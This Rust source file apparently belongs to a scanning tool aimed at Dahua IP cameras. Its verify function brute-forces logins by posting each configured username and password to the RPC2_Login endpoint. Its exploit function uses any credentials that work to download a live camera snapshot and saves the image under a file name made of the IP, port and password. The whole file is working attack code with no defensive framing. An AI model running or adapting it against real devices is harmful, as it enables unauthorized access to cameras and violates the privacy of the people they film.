use crate::config::Config;
use crate::poc::{download_snapshot, Poc, PocResult};
use anyhow::Result;
use reqwest::blocking::Client;
use serde_json::json;
use std::path::PathBuf;

pub struct DahuaWeakPassword {
    name: String,
    product: String,
}

impl DahuaWeakPassword {
    pub fn new(_config: &Config) -> Self {
        DahuaWeakPassword {
            name: "dahua-weak-password".to_string(),
            product: "dahua".to_string(),
        }
    }
}

impl Poc for DahuaWeakPassword {
    fn name(&self) -> &str {
        &self.name
    }

    fn product(&self) -> &str {
        &self.product
    }

    fn verify(&self, ip: &str, port: u16, config: &Config) -> Option<PocResult> {
        let url = format!("http://{}:{}/RPC2_Login", ip, port);
        let client = Client::builder()
            .timeout(std::time::Duration::from_secs(config.timeout))
            .build()
            .ok()?;

        for user in &config.users {
            for password in &config.passwords {
                let json_data = json!({
                    "method": "global.login",
                    "params": {
                        "userName": user,
                        "password": password,
                        "clientType": "Web3.0",
                        "loginType": "Direct",
                        "authorityType": "Default",
                        "passwordType": "Plain",
                    },
                    "id": 1,
                    "session": 0,
                });

                match client
                    .post(&url)
                    .header("User-Agent", &config.user_agent)
                    .header("Host", ip)
                    .header("Origin", &format!("http://{}", ip))
                    .header("Referer", &format!("http://{}", ip))
                    .header("Accept", "application/json, text/javascript, */*; q=0.01")
                    .header("Accept-Language", "zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2")
                    .header("Accept-Encoding", "gzip, deflate")
                    .header("Content-Type", "application/x-www-form-urlencoded; charset=UTF-8")
                    .header("Connection", "close")
                    .header("X-Requested-With", "XMLHttpRequest")
                    .json(&json_data)
                    .send()
                {
                    Ok(response) => {
                        if response.status().as_u16() == 200 {
                            if let Ok(json) = response.json::<serde_json::Value>() {
                                if json["result"] == true {
                                    return Some(PocResult {
                                        ip: ip.to_string(),
                                        port,
                                        product: self.product.clone(),
                                        user: user.clone(),
                                        password: password.clone(),
                                        vul_name: self.name.clone(),
                                    });
                                }
                            }
                        }
                    }
                    Err(_) => continue,
                }
            }
        }

        None
    }

    fn exploit(&self, result: &PocResult, config: &Config) -> Result<usize> {
        let url = format!(
            "http://{}:{}/cgi-bin/snapshot.cgi",
            result.ip, result.port
        );
        let file_name = format!(
            "{}-{}-{}-{}.jpg",
            result.ip, result.port, result.user, result.password
        );

        let snapshots_dir = PathBuf::from(&config.out_dir).join(&config.snapshots);
        let file_path = snapshots_dir.join(file_name);

        download_snapshot(
            &url,
            file_path.to_str().unwrap(),
            config,
            Some(&result.user),
            Some(&result.password),
        )
    }
}
